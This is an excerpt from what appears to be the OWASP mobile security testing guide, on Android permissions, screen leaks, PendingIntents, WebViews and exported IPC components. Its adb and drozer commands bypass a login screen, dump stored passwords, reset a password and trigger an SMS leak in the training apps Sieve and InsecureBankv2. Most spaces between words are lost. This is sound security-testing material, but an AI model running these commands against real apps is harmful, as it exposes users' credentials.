Alwayscheckwhethertheapplicationisrequestingpermissionsitactuallyrequires. Makesurethatnopermissionsare requestedwhicharenotrelatedtothegoaloftheapp,especiallyDANGEROUSandSIGNATUREpermissions,sincetheycan affectboththeuserandtheapplicationifmishandled. Forinstance,itshouldbesuspiciousifasingle-playergameapp requiresaccesstoandroid.permission.WRITE_SMS. Whenanalyzingpermissions,youshouldinvestigatetheconcreteusecasescenariosoftheappandalwayscheckifthere arereplacementAPIsforanyDANGEROUSpermissionsinuse. AgoodexampleistheSMSRetrieverAPIwhichstreamlines the usage of SMS permissions when performing SMS-based user verification. By using this API an application does not havetodeclareDANGEROUSpermissionswhichisabenefittoboththeuseranddevelopersoftheapplication,whodoesn’t havetosubmitthePermissionsDeclarationForm. Dynamic Analysis Permissionsforinstalledapplicationscanberetrievedwithadb. Thefollowingextractdemonstrateshowtoexaminethe permissionsusedbyanapplication. $adbshelldumpsyspackagecom.google.android.youtube ... declaredpermissions: com.google.android.youtube.permission.C2D_MESSAGE:prot=signature,INSTALLED requestedpermissions: android.permission.INTERNET android.permission.ACCESS_NETWORK_STATE install permissions: com.google.android.c2dm.permission.RECEIVE:granted=true android.permission.USE_CREDENTIALS:granted=true com.google.android.providers.gsf.permission.READ_GSERVICES:granted=true ... Theoutputshowsallpermissionsusingthefollowingcategories: • declaredpermissions: listofallcustompermissions. • requested and install permissions: list of all install-time permissions including normal and signature permis- sions. • runtimepermissions: listofalldangerouspermissions. Whendoingthedynamicanalysis: • Evaluatewhethertheappreallyneedstherequestedpermissions. Forinstance: asingle-playergamethatrequires accesstoandroid.permission.WRITE_SMS,mightnotbeagoodidea. • Inmanycasestheappcouldoptforalternativestodeclaringpermissions,suchas: – requestingtheACCESS_COARSE_LOCATIONpermissioninsteadofACCESS_FINE_LOCATION.Orevenbetternot requestingthepermissionatall,andinsteadasktheusertoenterapostalcode. – invokingtheACTION_IMAGE_CAPTUREorACTION_VIDEO_CAPTUREintentactioninsteadofrequestingtheCAM- ERApermission. – usingCompanionDevicePairing(Android8.0(APIlevel26)andhigher)whenpairingwithaBluetoothdevice instead of declaring the ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATIION, or BLUETOOTH_ADMIN permis- sions. • UsethePrivacyDashboard(Android12(APIlevel31)andhigher)toverifyhowtheappexplainsaccesstosensitive information. ToobtaindetailaboutaspecificpermissionyoucanrefertotheAndroidDocumentation. 264\nChecking for Sensitive Data Disclosure Through the User Interface Platform: android MASVSV1: MSTG-STORAGE-7 MASVSV2: MASVS-PLATFORM-3 Overview Static Analysis CarefullyreviewallUIcomponentsthateithershowsuchinformationortakeitasinput. Searchforanytracesofsensitive informationandevaluateifitshouldbemaskedorcompletelyremoved. Text Fields Tomake sure an application is masking sensitive user input, check for the following attribute in the definition ofEdit- Text: android:inputType="textPassword" Withthissetting,dots(insteadoftheinputcharacters)willbedisplayedinthetextfield,preventingtheappfromleaking passwordsorpinstotheuserinterface. App Notifications Whenstaticallyassessinganapplication,itisrecommendedtosearchforanyusageoftheNotificationManagerclass whichmightbeanindicationofsomeformofnotificationmanagement. Iftheclassisbeingused,thenextstepwouldbe tounderstandhowtheapplicationisgeneratingthenotifications. ThesecodelocationscanbefedintotheDynamicAnalysissectionbelow,providinganideaofwhereintheapplication notificationsmaybedynamicallygenerated. Dynamic Analysis Todeterminewhethertheapplicationleaksanysensitiveinformationtotheuserinterface,runtheapplicationandidentify componentsthatcouldbedisclosinginformation. Text Fields Iftheinformationismaskedby,forexample,replacinginputwithasterisksordots,theappisn’tleakingdatatotheuser interface. App Notifications Toidentifytheusageofnotificationsrunthroughtheentireapplicationandallitsavailablefunctionslookingforwaysto trigger any notifications. Consider that you may need to perform actions outside of the application in order to trigger certainnotifications. While running the application you may want to start tracing all calls to functions related to the notifications creation, e.g.setContentTitleorsetContentTextfromNotificationCompat.Builder. Observethetraceintheendandevalu- ateifitcontainsanysensitiveinformation. Finding Sensitive Information in Auto-Generated Screenshots 265\nPlatform: android MASVSV1: MSTG-STORAGE-9 MASVSV2: MASVS-PLATFORM-3 Overview Static Analysis A screenshot of the current activity is taken when an Android app goes into background and displayed for aesthetic purposeswhentheappreturnstotheforeground. However,thismayleaksensitiveinformation. Todeterminewhethertheapplicationmayexposesensitiveinformationviatheappswitcher,findoutwhethertheFLAG_- SECUREoptionhasbeenset. Youshouldfindsomethingsimilartothefollowingcodesnippet: ExampleinJava: getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE); setContentView(R.layout.activity_main); ExampleinKotlin: window.setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE) setContentView(R.layout.activity_main) Iftheoptionhasnotbeenset,theapplicationisvulnerabletoscreencapturing. Dynamic Analysis While black-box testing the app, navigate to any screen that contains sensitive information and click the home button tosendtheapptothebackground,thenpresstheappswitcherbuttontoseethesnapshot. Asshownbelow,ifFLAG_- SECUREisset(leftimage),thesnapshotwillbeempty;iftheflaghasnotbeenset(rightimage),activityinformationwill beshown: 266\nOndevicessupportingfile-basedencryption(FBE),snapshotsarestoredinthe/data/system_ce/<USER_ID>/<IMAGE_- FOLDER_NAME>folder. <IMAGE_FOLDER_NAME>dependsonthevendorbutmostcommonnamesaresnapshotsandre- cent_images. Ifthedevicedoesn’tsupportFBE,the/data/system/<IMAGE_FOLDER_NAME>folderisused. Accessingthesefoldersandthesnapshotsrequiresroot. Testing for Vulnerable Implementation of PendingIntent Platform: android MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 Overview When testing Pending Intents you must ensure that they are immutable and that the app explicitly specifies the exact package,action,andcomponentthatwillreceivethebaseintent. Static Analysis To identify vulnerable implementations, static analysis can be performed by looking for API calls used for obtaining a PendingIntent. SuchAPIsarelistedbelow: PendingIntent getActivity(Context,int,Intent,int) PendingIntent getActivity(Context,int,Intent,int,Bundle) PendingIntent getActivities(Context,int,Intent,int,Bundle) PendingIntent getActivities(Context,int,Intent,int) PendingIntent getForegroundService(Context,int,Intent,int) PendingIntent getService(Context,int,Intent,int) Onceanyoftheabovefunctionisspotted,checktheimplementationofthebaseintentandthePendingIntentforthe securitypitfallslistedinthePendingIntentssection. 267\nForexample,inA-156959408(CVE-2020-0389),thebaseintentisimplicitandalsothePendingIntentismutable,thus makingitexploitable. private Notification createSaveNotification(Uriuri){ IntentviewIntent =newIntent(Intent.ACTION_VIEW) .setFlags(Intent.FLAG_ACTIVITY_NEW_TASK |Intent.FLAG_GRANT_READ_URI_PERMISSION) .setDataAndType(uri,"video/mp4");//ImplicitIntent //...skip... Notification.Builder builder =newNotification.Builder(this,CHANNEL_ID) .setSmallIcon(R.drawable.ic_android) .setContentTitle(getResources().getString(R.string.screenrecord_name)) .setContentText(getResources().getString(R.string.screenrecord_save_message)) .setContentIntent(PendingIntent.getActivity( this, REQUEST_CODE, viewIntent, Intent.FLAG_GRANT_READ_URI_PERMISSION)) //MutablePendingIntent. .addAction(shareAction) .addAction(deleteAction) .setAutoCancel(true); Dynamic Analysis FridacanbeusedtohooktheAPIsusedtogetaPendingIntent. Thisinformationcanbeusedtodeterminethecode locationofthecall,whichcanbefurtherusedtoperformstaticanalysisasdescribedabove. Here’sanexampleofsuchaFridascriptthatcanbeusedtohookthePendingIntent.getActivityfunction: varpendingIntent =Java.use('android.app.PendingIntent'); vargetActivity_1 =pendingIntent.getActivity.overload("android.content.Context","int","android.content.Intent","int"); getActivity_1.implementation =function(context,requestCode,intent,flags){ console.log("[*]CallingPendingIntent.getActivity("+intent.getAction()+")"); console.log("\t[-]BaseIntenttoString:" +intent.toString()); console.log("\t[-]BaseIntentgetExtras:" +intent.getExtras()); console.log("\t[-]BaseIntentgetFlags:" +intent.getFlags()); return this.getActivity(context,requestCode,intent,flags); } Thisapproachcanbehelpfulwhendealingwithapplicationswithlargecodebases,wheredeterminingthecontrolflow cansometimesbetricky. Testing JavaScript Execution in WebViews Platform: android MASVSV1: MSTG-PLATFORM-5 MASVSV2: MASVS-PLATFORM-2 Overview TotestforJavaScriptexecutioninWebViewschecktheappforWebViewusageandevaluatewhetherornoteachWebView shouldallowJavaScriptexecution. IfJavaScriptexecutionisrequiredfortheapptofunctionnormally,thenyouneedto ensurethattheappfollowstheallbestpractices. Static Analysis TocreateanduseaWebView,anappmustcreateaninstanceoftheWebViewclass. 268\nWebViewwebview =newWebView(this); setContentView(webview); webview.loadUrl("https://www.owasp.org/"); Various settings can be applied to the WebView (activating/deactivating JavaScript is one example). JavaScript is dis- abledbydefaultforWebViewsandmustbeexplicitlyenabled. LookforthemethodsetJavaScriptEnabledtocheckfor JavaScriptactivation. webview.getSettings().setJavaScriptEnabled(true); ThisallowstheWebViewtointerpretJavaScript. Itshouldbeenabledonlyifnecessarytoreducetheattacksurfacetothe app. IfJavaScriptisnecessary,youshouldmakesurethat • The communication to the endpoints consistently relies on HTTPS (or other protocols that allow encryption) to protectHTMLandJavaScriptfromtamperingduringtransmission. • JavaScriptandHTMLareloadedlocally,fromwithintheappdatadirectoryorfromtrustedwebserversonly. • The user cannot define which sources to load by means of loading different resources based on a user provided input. ToremoveallJavaScriptsourcecodeandlocallystoreddata,cleartheWebView’scachewithclearCachewhentheapp closes. DevicesrunningplatformsolderthanAndroid4.4(APIlevel19)useaversionofWebKitthathasseveralsecurityissues. As aworkaround,theappmustconfirmthatWebViewobjectsdisplayonlytrustedcontentiftheapprunsonthesedevices. Dynamic Analysis DynamicAnalysisdependsonoperatingconditions. ThereareseveralwaystoinjectJavaScriptintoanapp’sWebView: • StoredCross-SiteScriptingvulnerabilitiesinanendpoint;theexploitwillbesenttothemobileapp’sWebViewwhen theusernavigatestothevulnerablefunction. • Attackertakesaman-in-the-middle(MITM)positionandtamperswiththeresponsebyinjectingJavaScript. • MalwaretamperingwithlocalfilesthatareloadedbytheWebView. Toaddresstheseattackvectors,checkthefollowing: • AllfunctionsofferedbytheendpointshouldbefreeofstoredXSS. • OnlyfilesthatareintheappdatadirectoryshouldberenderedinaWebView(seetestcase“TestingforLocalFile InclusioninWebViews”). • TheHTTPScommunicationmustbeimplementedaccordingtobestpracticestoavoidMITMattacks. Thismeans: – allcommunicationisencryptedviaTLS, – thecertificateischeckedproperly,and/or – thecertificateshouldbepinned. Testing for Sensitive Functionality Exposure Through IPC Platform: android MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 Overview TotestforsensitivefunctionalityexposurethroughIPCmechanismsyoushouldfirstenumeratealltheIPCmechanisms theappusesandthentrytoidentifywhethersensitivedataisleakedwhenthemechanismsareused. 269\nStatic Analysis WestartbylookingattheAndroidManifest.xml,whereallactivities,services,andcontentprovidersincludedintheapp mustbedeclared(otherwisethesystemwon’trecognizethemandtheywon’trun). • <intent-filter> • <service> • <provider> • <receiver> An “exported” activity, service, or content can be accessed by other apps. There are two common ways to designate a component as exported. The obvious one is setting the export tag to true android:exported="true". The second wayinvolvesdefiningan<intent-filter>withinthecomponentelement(<activity>,<service>,<receiver>). When this is done, the export tag is automatically set to “true”. To prevent all other Android apps from interacting with the IPC component element, be sure that the android:exported="true" value and an <intent-filter> aren’t in their AndroidManifest.xmlfilesunlessthisisnecessary. Rememberthatusingthepermissiontag(android:permission)willalsolimitotherapplications’accesstoacomponent. If your IPC is intended to be accessible to other applications, you can apply a security policy with the <permission> elementandsetaproperandroid:protectionLevel. Whenandroid:permissionisusedinaservicedeclaration,other applications must declare a corresponding<uses-permission> element in their own manifest to start, stop, or bind to theservice. Formoreinformationaboutthecontentproviders,pleaserefertothetestcase“TestingWhetherStoredSensitiveDataIs ExposedviaIPCMechanisms”inchapter“TestingDataStorage”. Once you identify a list of IPC mechanisms, review the source code to see whether sensitive data is leaked when the mechanismsareused. Forexample,contentproviderscanbeusedtoaccessdatabaseinformation,andservicescanbe probedtoseeiftheyreturndata. Broadcastreceiverscanleaksensitiveinformationifprobedorsniffed. Inthefollowing,weusetwoexampleappsandgiveexamplesofidentifyingvulnerableIPCcomponents: • “Sieve” • “AndroidInsecureBank” Activities Inspect the AndroidManifest Inthe“Sieve”app,wefindthreeexportedactivities,identifiedby<activity>: <activity android:excludeFromRecents="true" android:label="@string/app_name" android:launchMode="singleTask" android:name=".MainLoginActivity" ↪ android:windowSoftInputMode="adjustResize|stateVisible"> <intent-filter> <action android:name="android.intent.action.MAIN" /> <category android:name="android.intent.category.LAUNCHER" /> </intent-filter> </activity> <activity android:clearTaskOnLaunch="true" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="true" ↪ android:label="@string/title_activity_file_select" android:name=".FileSelectActivity" /> <activity android:clearTaskOnLaunch="true" android:excludeFromRecents="true" android:exported="true" android:finishOnTaskLaunch="true" ↪ android:label="@string/title_activity_pwlist" android:name=".PWList" /> Inspect the Source Code ByinspectingthePWList.javaactivity,weseethatitoffersoptionstolistallkeys,add,delete,etc. Ifweinvokeitdirectly, wewillbeabletobypasstheLoginActivity. Moreonthiscanbefoundinthedynamicanalysisbelow. Services 270\nInspect the AndroidManifest Inthe“Sieve”app,wefindtwoexportedservices,identifiedby<service>: <service android:exported="true" android:name=".AuthService" android:process=":remote" /> <service android:exported="true" android:name=".CryptoService" android:process=":remote" /> Inspect the Source Code Checkthesourcecodefortheclassandroid.app.Service: By reversing the target application, we can see that the service AuthService provides functionality for changing the passwordandPIN-protectingthetargetapp. public void handleMessage(Messagemsg){ AuthService.this.responseHandler =msg.replyTo; BundlereturnBundle =msg.obj; intresponseCode; intreturnVal; switch (msg.what){ ... case AuthService.MSG_SET /*6345*/: if(msg.arg1 ==AuthService.TYPE_KEY)/*7452*/ { responseCode =42; if(AuthService.this.setKey(returnBundle.getString("com.mwr.example.sieve.PASSWORD"))){ returnVal =0; }else { returnVal =1; } }else if(msg.arg1 ==AuthService.TYPE_PIN){ responseCode =41; if(AuthService.this.setPin(returnBundle.getString("com.mwr.example.sieve.PIN"))){ returnVal =0; }else { returnVal =1; } }else { sendUnrecognisedMessage(); return; } } } Broadcast Receivers Inspect the AndroidManifest Inthe“AndroidInsecureBank”app,wefindabroadcastreceiverinthemanifest,identifiedby<receiver>: <receiver android:exported="true" android:name="com.android.insecurebankv2.MyBroadCastReceiver"> <intent-filter> <action android:name="theBroadcast" /> </intent-filter> </receiver> Inspect the Source Code SearchthesourcecodeforstringslikesendBroadcast,sendOrderedBroadcast,andsendStickyBroadcast. Makesure thattheapplicationdoesn’tsendanysensitivedata. IfanIntentisbroadcastedandreceivedwithintheapplicationonly,LocalBroadcastManagercanbeusedtopreventother appsfromreceivingthebroadcastmessage. Thisreducestheriskofleakingsensitiveinformation. Tounderstandmoreaboutwhatthereceiverisintendedtodo,wehavetogodeeperinourstaticanalysisandsearchfor usage of the class android.content.BroadcastReceiver and the Context.registerReceiver method, which is used todynamicallycreatereceivers. Thefollowingextractofthetargetapplication’ssourcecodeshowsthatthebroadcastreceivertriggerstransmissionof anSMSmessagecontainingtheuser’sdecryptedpassword. 271\npublic class MyBroadCastReceiver extends BroadcastReceiver { StringusernameBase64ByteString; public static final StringMYPREFS ="mySharedPreferences"; @Override public void onReceive(Contextcontext,Intentintent){ //TODO Auto-generatedmethodstub Stringphn =intent.getStringExtra("phonenumber"); Stringnewpass =intent.getStringExtra("newpass"); if(phn!=null){ try{ SharedPreferencessettings =context.getSharedPreferences(MYPREFS,Context.MODE_WORLD_READABLE); final Stringusername =settings.getString("EncryptedUsername",null); byte[]usernameBase64Byte =Base64.decode(username,Base64.DEFAULT); usernameBase64ByteString =newString(usernameBase64Byte,"UTF-8"); final Stringpassword =settings.getString("superSecurePassword",null); CryptoClasscrypt =newCryptoClass(); StringdecryptedPassword =crypt.aesDeccryptedString(password); StringtextPhoneno =phn.toString(); StringtextMessage ="UpdatedPasswordfrom:"+decryptedPassword+"to: "+newpass; SmsManagersmsManager =SmsManager.getDefault(); System.out.println("Forthechangepassword-phonenumber:"+textPhoneno+"password is:"+textMessage); smsManager.sendTextMessage(textPhoneno,null,textMessage,null,null); } } } } BroadcastReceiversshouldusetheandroid:permissionattribute; otherwise, otherapplicationscaninvokethem. You canuseContext.sendBroadcast(intent, receiverPermission);tospecifypermissionsareceivermusthavetoread thebroadcast. YoucanalsosetanexplicitapplicationpackagenamethatlimitsthecomponentsthisIntentwillresolve to. Ifleftasthedefaultvalue(null),allcomponentsinallapplicationswillbeconsidered. Ifnon-null,theIntentcanmatch onlythecomponentsinthegivenapplicationpackage. Dynamic Analysis YoucanenumerateIPCcomponentswithMobSF.TolistallexportedIPCcomponents,uploadtheAPKfileandthecompo- nentscollectionwillbedisplayedinthefollowingscreen: Content Providers The “Sieve” application implements a vulnerable content provider. To list the content providers exported by the Sieve app,executethefollowingcommand: $adbshelldumpsyspackagecom.mwr.example.sieve |grep -Po"Provider{[\w\d\s\./]+}" |sort -u Provider{34a20d5com.mwr.example.sieve/.FileBackupProvider} Provider{64f10eacom.mwr.example.sieve/.DBContentProvider} Once identified, you can use jadx to reverse engineer the app and analyze the source code of the exported content providerstoidentifypotentialvulnerabilities. Toidentifythecorrespondingclassofacontentprovider,usethefollowinginformation: 272\n• PackageName: com.mwr.example.sieve. • ContentProviderClassName: DBContentProvider. Whenanalyzingtheclasscom.mwr.example.sieve.DBContentProvider,you’llseethatitcontainsseveralURIs: package com.mwr.example.sieve; ... public class DBContentProvider extends ContentProvider { public static final UriKEYS_URI =Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Keys"); public static final UriPASSWORDS_URI =Uri.parse("content://com.mwr.example.sieve.DBContentProvider/Passwords"); ... } UsethefollowingcommandstocallthecontentproviderusingtheidentifiedURIs: $adbshellcontentquery --uri content://com.mwr.example.sieve.DBContentProvider/Keys/ Row:0Password=1234567890AZERTYUIOPazertyuiop,pin=1234 $adbshellcontentquery --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ Row:0_id=1,service=test,username=test,password=BLOB,email=t@tedt.com Row:1_id=2,service=bank,username=owasp,password=BLOB,email=user@tedt.com $adbshellcontentquery --uri content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection email:username:password --where 'service=\"bank\"' Row:0email=user@tedt.com,username=owasp,password=BLOB Youareablenowtoretrievealldatabaseentries(seealllinesstartingwith“Row:” intheoutput). Activities Tolistactivitiesexportedbyanapplication,youcanusethefollowingcommandandfocusonactivityelements: $aaptdxmltreesieve.apkAndroidManifest.xml ... E:activity (line=32) A:android:label(0x01010001)=@0x7f05000f A:android:name(0x01010003)=".FileSelectActivity" (Raw: ".FileSelectActivity") A:android:exported(0x01010010)=(type0x12)0xffffffff A:android:finishOnTaskLaunch(0x01010014)=(type0x12)0xffffffff A:android:clearTaskOnLaunch(0x01010015)=(type0x12)0xffffffff A:android:excludeFromRecents(0x01010017)=(type0x12)0xffffffff E:activity (line=40) A:android:label(0x01010001)=@0x7f050000 A:android:name(0x01010003)=".MainLoginActivity" (Raw: ".MainLoginActivity") A:android:excludeFromRecents(0x01010017)=(type0x12)0xffffffff A:android:launchMode(0x0101001d)=(type0x10)0x2 A:android:windowSoftInputMode(0x0101022b)=(type0x11)0x14 E:intent-filter (line=46) E:action (line=47) A:android:name(0x01010003)="android.intent.action.MAIN" (Raw: "android.intent.action.MAIN") E:category (line=49) A:android:name(0x01010003)="android.intent.category.LAUNCHER" (Raw: "android.intent.category.LAUNCHER") E:activity (line=52) A:android:label(0x01010001)=@0x7f050009 A:android:name(0x01010003)=".PWList" (Raw: ".PWList") A:android:exported(0x01010010)=(type0x12)0xffffffff A:android:finishOnTaskLaunch(0x01010014)=(type0x12)0xffffffff A:android:clearTaskOnLaunch(0x01010015)=(type0x12)0xffffffff A:android:excludeFromRecents(0x01010017)=(type0x12)0xffffffff E:activity (line=60) A:android:label(0x01010001)=@0x7f05000a A:android:name(0x01010003)=".SettingsActivity" (Raw: ".SettingsActivity") A:android:finishOnTaskLaunch(0x01010014)=(type0x12)0xffffffff A:android:clearTaskOnLaunch(0x01010015)=(type0x12)0xffffffff A:android:excludeFromRecents(0x01010017)=(type0x12)0xffffffff ... Youcanidentifyanexportedactivityusingoneofthefollowingproperties: • Ithaveanintent-filtersubdeclaration. • Ithavetheattributeandroid:exportedto0xffffffff. YoucanalsousejadxtoidentifyexportedactivitiesinthefileAndroidManifest.xmlusingthecriteriadescribedabove: 273\n<?xml version="1.0" encoding="utf-8"?> <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.mwr.example.sieve"> ... Thisactivityisexportedviatheattribute"exported" <activity android:name=".FileSelectActivity" android:exported="true" /> Thisactivityisexportedviathe"intent-filter"declaration <activity android:name=".MainLoginActivity"> <intent-filter> <action android:name="android.intent.action.MAIN"/> <category android:name="android.intent.category.LAUNCHER"/> </intent-filter> </activity> Thisactivityisexportedviatheattribute"exported" <activity android:name=".PWList" android:exported="true" /> Activitiesbelowarenotexported <activity android:name=".SettingsActivity" /> <activity android:name=".AddEntryActivity"/> <activity android:name=".ShortLoginActivity" /> <activity android:name=".WelcomeActivity" /> <activity android:name=".PINActivity" /> ... </manifest> Enumeratingactivitiesinthevulnerablepasswordmanager“Sieve”showsthatthefollowingactivitiesareexported: • .MainLoginActivity • .PWList • .FileSelectActivity Usethecommandbelowtolaunchanactivity: ##Starttheactivitywithoutspecifyinganactionorancategory $adbshellamstart -ncom.mwr.example.sieve/.PWList Starting:Intent{cmp=com.mwr.example.sieve/.PWList} ##Starttheactivityindicatinganaction(-a)andancategory(-c) $adbshellamstart -n"com.mwr.example.sieve/.MainLoginActivity" -aandroid.intent.action.MAIN -candroid.intent.category.LAUNCHER Starting:Intent{act=android.intent.action.MAINcat=[android.intent.category.LAUNCHER]cmp=com.mwr.example.sieve/.MainLoginActivity} Sincetheactivity.PWListiscalleddirectlyinthisexample,youcanuseittobypasstheloginformprotectingthepassword manager,andaccessthedatacontainedwithinthepasswordmanager. Services ServicescanbeenumeratedwiththeDrozermoduleapp.service.info: dz>runapp.service.info -acom.mwr.example.sieve Package:com.mwr.example.sieve com.mwr.example.sieve.AuthService Permission:null com.mwr.example.sieve.CryptoService Permission:null Tocommunicatewithaservice,youmustfirstusestaticanalysistoidentifytherequiredinputs. Becausethisserviceisexported,youcanusethemoduleapp.service.sendtocommunicatewiththeserviceandchange thepasswordstoredinthetargetapplication: dz>runapp.service.sendcom.mwr.example.sievecom.mwr.example.sieve.AuthService --msg 63457452 1 --extra stringcom.mwr.example.sieve.PASSWORD ↪ "abcdabcdabcdabcd" --bundle-as-obj Gotareplyfromcom.mwr.example.sieve/com.mwr.example.sieve.AuthService: what:4 arg1:42 arg2:0 Empty Broadcast Receivers Tolist broadcastreceiversexportedby an application, you can use thefollowing command and focus onreceiver ele- ments: 274\n$aaptdxmltreeInsecureBankv2.apkAndroidManifest.xml ... E:receiver (line=88) A:android:name(0x01010003)="com.android.insecurebankv2.MyBroadCastReceiver" (Raw: "com.android.insecurebankv2.MyBroadCastReceiver") A:android:exported(0x01010010)=(type0x12)0xffffffff E:intent-filter (line=91) E:action (line=92) A:android:name(0x01010003)="theBroadcast" (Raw: "theBroadcast") E:receiver (line=119) A:android:name(0x01010003)="com.google.android.gms.wallet.EnableWalletOptimizationReceiver" (Raw: ↪ "com.google.android.gms.wallet.EnableWalletOptimizationReceiver") A:android:exported(0x01010010)=(type0x12)0x0 E:intent-filter (line=122) E:action (line=123) A:android:name(0x01010003)="com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION" (Raw: "com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION") ... Youcanidentifyanexportedbroadcastreceiverusingoneofthefollowingproperties: • Ithasanintent-filtersubdeclaration. • Ithastheattributeandroid:exportedsetto0xffffffff. YoucanalsousejadxtoidentifyexportedbroadcastreceiversinthefileAndroidManifest.xmlusingthecriteriadescribed above: <?xml version="1.0" encoding="utf-8"?> <manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.android.insecurebankv2"> ... Thisbroadcastreceiverisexportedviatheattribute"exported"aswellasthe"intent-filter"declaration <receiver android:name="com.android.insecurebankv2.MyBroadCastReceiver" android:exported="true"> <intent-filter> <action android:name="theBroadcast"/> </intent-filter> </receiver> ThisbroadcastreceiverisNOTexportedbecausetheattribute"exported"isexplicitlysettofalse <receiver android:name="com.google.android.gms.wallet.EnableWalletOptimizationReceiver" android:exported="false"> <intent-filter> <action android:name="com.google.android.gms.wallet.ENABLE_WALLET_OPTIMIZATION"/> </intent-filter> </receiver> ... </manifest> The above example from the vulnerable banking application InsecureBankv2 shows that only the broadcast receiver namedcom.android.insecurebankv2.MyBroadCastReceiverisexported. Nowthatyouknowthatthereisanexportedbroadcastreceiver,youcandivedeeperandreverseengineertheappusing jadx. Thiswillallowyoutoanalyzethesourcecodesearchingforpotentialvulnerabilitiesthatyoucouldlatertrytoexploit. Thesourcecodeoftheexportedbroadcastreceiveristhefollowing: package com.android.insecurebankv2; ... public class MyBroadCastReceiver extends BroadcastReceiver { public static final StringMYPREFS ="mySharedPreferences"; StringusernameBase64ByteString; public void onReceive(Contextcontext,Intentintent){ Stringphn =intent.getStringExtra("phonenumber"); Stringnewpass =intent.getStringExtra("newpass"); if(phn!=null){ try{ SharedPreferencessettings =context.getSharedPreferences("mySharedPreferences",1); this.usernameBase64ByteString =newString(Base64.decode(settings.getString("EncryptedUsername",(String)null),0),"UTF-8"); StringdecryptedPassword =newCryptoClass().aesDeccryptedString(settings.getString("superSecurePassword",(String)null)); StringtextPhoneno =phn.toString(); StringtextMessage ="UpdatedPasswordfrom:" +decryptedPassword +"to: " +newpass; SmsManagersmsManager =SmsManager.getDefault(); System.out.println("Forthechangepassword-phonenumber:" + textPhoneno +"password is:" +textMessage); smsManager.sendTextMessage(textPhoneno,(String)null,textMessage,(PendingIntent)null,(PendingIntent)null); }catch (Exceptione){ e.printStackTrace(); } }else { System.out.println("Phonenumberisnull"); } } } As you can see in the source code, this broadcast receiver expects two parameters named phonenumber and newpass. Withthisinformationyoucannowtrytoexploitthisbroadcastreceiverbysendingeventstoitusingcustomvalues: 275\n##Sendaneventwiththefollowingproperties: ##Actionissetto"theBroadcast" ##Parameter"phonenumber"issettothestring"07123456789" ##Parameter"newpass"issettothestring"12345" $adbshellambroadcast -atheBroadcast --es phonenumber "07123456789" --es newpass "12345" Broadcasting:Intent{act=theBroadcastflg=0x400000 (hasextras)} Broadcastcompleted:result=0 ThisgeneratesthefollowingSMS: UpdatedPasswordfrom:SecretPassword@to:12345 Sniffing Intents IfanAndroidapplicationbroadcastsintentswithoutsettingarequiredpermissionorspecifyingthedestinationpackage, theintentscanbemonitoredbyanyapplicationthatrunsonthedevice. Toregisterabroadcastreceivertosniffintents,usetheDrozermoduleapp.broadcast.sniffandspecifytheactionto monitorwiththe--actionparameter: dz>runapp.broadcast.sniff --action theBroadcast [*]Broadcastreceiverregisteredtosniffmatchingintents [*]Outputisupdatedonceasecond.PressControl+Ctoexit. Action:theBroadcast Raw:Intent{act=theBroadcastflg=0x10 (hasextras)} Extra:phonenumber=07123456789 (java.lang.String) Extra:newpass=12345 (java.lang.String)` You can also use the following command to sniff the intents. However, the content of the extras passed will not be displayed: $adbshelldumpsysactivitybroadcasts |grep "theBroadcast" BroadcastRecord{fc2f46fu0theBroadcast}touser0 Intent{act=theBroadcastflg=0x400010 (hasextras)} BroadcastRecord{7d4f24du0theBroadcast}touser0 Intent{act=theBroadcastflg=0x400010 (hasextras)} 45:act=theBroadcastflg=0x400010 (hasextras) 46:act=theBroadcastflg=0x400010 (hasextras) 121:act=theBroadcastflg=0x400010 (hasextras) 144:act=theBroadcastflg=0x400010 (hasextras) Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms Platform: android MASVSV1: MSTG-STORAGE-6 MASVSV2: MASVS-PLATFORM-1 Overview Static Analysis ThefirststepistolookatAndroidManifest.xmltodetectcontentprovidersexposedbytheapp. Youcanidentifycontent providersbythe<provider>element. Completethefollowingsteps: • Determinewhetherthevalueoftheexporttag(android:exported)is"true". Evenifitisnot,thetagwillbesetto "true"automaticallyifan<intent-filter>hasbeendefinedforthetag. Ifthecontentismeanttobeaccessed onlybytheappitself,setandroid:exportedto"false". Ifnot,settheflagto"true"anddefineproperread/write permissions. • Determinewhetherthedataisbeingprotectedbyapermissiontag(android:permission). Permissiontagslimit exposuretootherapps. 276\n• Determinewhethertheandroid:protectionLevelattributehasthevaluesignature. Thissettingindicatesthat the data is intended to be accessed only by apps from the same enterprise (i.e., signed with the same key). To make the data accessible to other apps, apply a security policy with the <permission> element and set a properandroid:protectionLevel. Ifyouuseandroid:permission,otherapplicationsmustdeclarecorrespond- ing <uses-permission> elements in their manifests to interact with your content provider. You can use the an- droid:grantUriPermissionsattributetograntmorespecificaccesstootherapps;youcanlimitaccesswiththe <grant-uri-permission>element. Inspectthesourcecodetounderstandhowthecontentproviderismeanttobeused. Searchforthefollowingkeywords: • android.content.ContentProvider • android.database.Cursor • android.database.sqlite • .query • .update • .delete ToavoidSQLinjectionattackswithintheapp,useparameterizedquerymethods,suchasquery,update,anddelete. Besuretoproperlysanitizeallmethodarguments;forexample,theselectionargumentcouldleadtoSQLinjection ifitismadeupofconcatenateduserinput. If you expose a content provider, determine whether parameterized query methods (query, update, and delete) are beingusedtopreventSQLinjection. Ifso,makesurealltheirargumentsareproperlysanitized. WewillusethevulnerablepasswordmanagerappSieveasanexampleofavulnerablecontentprovider. Inspect the Android Manifest Identifyalldefined<provider>elements: <provider android:authorities="com.mwr.example.sieve.DBContentProvider" android:exported="true" android:multiprocess="true" android:name=".DBContentProvider"> <path-permission android:path="/Keys" android:readPermission="com.mwr.example.sieve.READ_KEYS" android:writePermission="com.mwr.example.sieve.WRITE_KEYS" /> </provider> <provider 